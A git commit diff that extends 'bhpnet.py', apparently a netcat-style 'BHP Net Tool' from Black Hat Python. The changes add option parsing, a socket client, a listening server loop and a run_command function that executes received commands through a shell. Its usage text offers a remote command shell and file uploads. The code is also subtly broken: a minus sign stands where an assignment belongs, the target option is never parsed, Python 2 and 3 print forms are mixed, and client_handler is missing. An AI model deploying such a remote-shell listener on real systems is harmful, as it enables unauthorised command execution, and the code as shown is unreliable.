50c98557d76dbf1d90efd1a44c9d6c1b54368ec4
Serj Greensky <itpluspc@ya.ru>
2016-12-14 16:03:51 +0300

    BHP Net Tool, command server

--- bhpnet.py
+++ bhpnet.py
@@ -19,8 +19,8 @@ def usage():
 	print("-e --execute=file_to_run			- execute the given file upon receiving a connction")
 	print("-c --command						- initialize a command shell")
 	print("-u --upload=upload_destination	- upon receiving connection upload a file and write to [destination]")
-	print()
-	print()
+	print
+	print
 	print("Examples: ")
 	print("bhpnet.py -t 192.168.1.1 -p 5555 -l -c")
 	print("bhpnet.py -t 192.168.1.1 -p 5555 -l -u=/root/target.bin")
@@ -39,5 +39,112 @@ def main():
 	if not len(sys.argv[1:]):
 		usage()
 
+	# read command line options
+	try:
+		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
+	except getopt.GetoptError as err:
+		print str(err)
+		usage()
+
+	for o, a in opts:
+		if o in ("-h", "--help"):
+			usage()
+		elif o in ("-l", "--listen"):
+			listen = True
+		elif o in ("-e", "--execute"):
+			execute = a
+		elif o in ("-c", "--command"):
+			command = True
+		elif o in ("-u", "--upload"):
+			upload_destination = a
+		elif o in ("-p", "--port"):
+			port = int(a)
+		else:
+			assert False, "Unhandled Option"
+
+	# are we going to listen ot just send data from stdin?
+	if not listen and len(target) and port > 0:
+		# read in the buffer from commandline
+		# this will block, so send CTRL-D if not sending input
+		# to stdin
+		buffer = sys.stdin.read()
+
+		# send data off
+		client_sender(buffer)
+
+	# we are going to listen and potentially
+	# upload things, execute commands, and drop a shell back
+	# depending on our command line options above
+	if listen:
+		server_loop()
+
+def client_sender(buffer):
+	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		# connect to our target host
+		client.connect((target,port))
+		if len(buffer):
+			client.send(buffer)
+		while True:
+
+			# now wait for data check
+			recv_len = 1
+			response = ""
+
+			while recv_len:
+				data		= client.recv(4096)
+				recv_len	= len(data)
+				response	+= data
+
+				if recv_len < 4096:
+					break
+
+				print(response,)
+
+				# wait for more input
+				buffer = raw_input("")
+				buffer += "\n"
+
+				# send it off
+				client.send(buffer)
+
+	except:
+		print("[*] Exception! Exiting.")
+
+		# tear down the connection
+		client.close()
+
+def server_loop():
+	global target
+
+	# if no target is defined, we listen on all interfaces
+	if not len(target):
+		target = "0.0.0.0"
+
+	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server.bind((target,port))
+	server.listen(5)
+
+	while True:
+		client_socket, addr = server.accept()
+
+		# spin off a thread to handle our new client
+		client_thread - threading.Thread(target=client_handler, args=(client_socket,))
+		client_thread.start()
+
+def run_command(command):
+
+	# trim the new line
+	command = command.rstrip()
+
+	# run the command and get the output back
+	try:
+		output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
+	except:
+		output = "Failed to execute command.\r\n"
+
+	# send the output back to the client
+	return output
 
 main()
